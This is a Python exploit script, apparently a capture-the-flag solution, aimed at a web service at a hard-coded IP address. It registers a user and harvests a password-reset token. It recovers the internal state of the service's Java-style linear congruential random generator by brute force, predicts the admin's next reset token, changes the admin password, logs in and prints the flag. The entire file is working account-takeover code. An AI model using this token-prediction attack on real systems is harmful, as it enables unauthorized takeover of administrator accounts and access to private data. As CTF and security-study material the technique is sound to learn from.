#!/usr/bin/env python3

from string import ascii_lowercase
from random import randrange
import requests
from bs4 import BeautifulSoup
from http.client import HTTPConnection

# Set debug output level (1 = spam)
HTTPConnection.debuglevel = 0

SERVER = "http://116.202.83.208:42300"
PROXY = {"http": "http://127.0.0.1:8080"}
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

class Random(object):
  def __init__(self, seed):
    self.seed = seed
    self.multiplier = 0x5DEECE66D
    self.addend = 0xB
    self.mask = (1 << 48) - 1

  def _next(self):
    newseed = (self.seed * self.multiplier + self.addend) & self.mask
    self.seed = newseed
    #print(f"newseed: {newseed}")
    return newseed >> 22

  def next(self):
    return self._next() + self._next()  * 2**21 + self._next()  * 2**42

  def next_limit(self, limit):
    return self.next() % limit

def brute_seeds(token):
  t = int(token)
  t_rsh_21 = t >> 21
  t_rsh_43 = t >> 43
  t_and_7fff8 = t & 0x7fff8000000
  a = 0x5DEECE66D # multiplier
  c = 0xB # addend
  mask = (1 << 48) -1

  n0_middle_bits = (t & 0x1fffff) << 22
  done = False

  for cur_upper_bits in range(1 << 5):
    if done:
      break

    for cur_lower_bits in range(1 << 22):
      n0 = n0_middle_bits
      n0 += cur_upper_bits << 43
      n0 += cur_lower_bits
      n1 = (a * n0 + c) & mask

      # constraint0
      if (n1 >> 1) & 0x7fff8000000 != t_and_7fff8:
        continue

      # constraint1
      if cur_upper_bits + (n1 >> 22) & 0x3f != (t_rsh_21) & 0x3f:
        continue

      n2 = (a * n1 + c) & mask
      t2 = ((n0 >> 22) + ((n1 >> 22) << 21) + ((n2 >> 22) << 42)) & 0xffffffffffff
      if t2 == t:
        done = True
        return(n0, n1, n2)
        break

if __name__ == "__main__":

  # Generate random account name and admin reset pw
  name = "".join(ascii_lowercase[randrange(len(ascii_lowercase))] for i in range(10))
  admin_reset_pw = "".join(ascii_lowercase[randrange(len(ascii_lowercase))] for i in range(10))
  pweditorial = "pwedit"
  pwmail = "pwmail"

  # Register the account
  print(f"[*] Registering user {name} with editorial pw={pweditorial} and mail pw={pwmail}")
  requests.post(SERVER + "/register", data=f"name={name}&pweditorial={pweditorial}&pwmail={pwmail}", headers=HEADERS, proxies=PROXY)

  # Fire password reset
  print(f"[*] Requesting password reset token for user {name}")
  requests.post(SERVER + "/reset", data=f"name={name}", headers=HEADERS, proxies=PROXY)

  # Query mails
  print(f"[*] Gathering reset tokens from mailbox")
  resp = requests.post(SERVER + "/mailbox", data=f"username={name}&pwmail={pwmail}", headers=HEADERS, proxies=PROXY)

  # Parse response for token
  soup = BeautifulSoup(resp.text, 'html.parser')

  # Get table row list
  trs = soup.select("table > tbody > tr")

  # Grab reset token from row 1, column 1 (skip first row = welcome mail)
  tds = trs[1].select("td")
  token = int(tds[1].text.split(".")[0].split()[-1]) # split by '.', then space, last word is token
  print(f"[=] Timestamp = {tds[0].text}, Token = {token} ({hex(token)})")

  # brute custom PRNG seeds (internal state) for this token
  n0, n1, n2 = brute_seeds(token)
  
  # clone internal state of custom PRNG (seed with n2) in order to calculate the next token
  random = Random(n2)
  next_token = random.next_limit(281474976710656)

  print(f"[=] Next token after {token} will be {next_token}")

  # requesting reset token for admin
  print(f"[*] Requesting password reset token for user admin")
  requests.post(SERVER + "/reset", data=f"name=admin", headers=HEADERS, proxies=PROXY)

  # change admin pw to admin_reset_pw
  print(f"[*] Changing password for user admin to {admin_reset_pw}")
  requests.post(SERVER + "/chpass", data=f"name=admin&resettoken={next_token}&new_pweditorial={admin_reset_pw}", headers=HEADERS, proxies=PROXY)

  # grabbing editorial entries for user admin
  print(f"[*] Grabbing editorial entries for user admin")
  resp = requests.post(SERVER + "/login", data=f"name=admin&pweditorial={admin_reset_pw}", headers=HEADERS, proxies=PROXY)

  # Parse response for token
  soup = BeautifulSoup(resp.text, 'html.parser')

  # Get table row list
  trs = soup.select("table > tbody > tr")

  # Grab columns for row 3 (skip first 2 rows, flag is in third row, first column)
  tds = trs[2].select("td")
  flag = tds[0].text
  print(f"[*] Flag = {flag}")
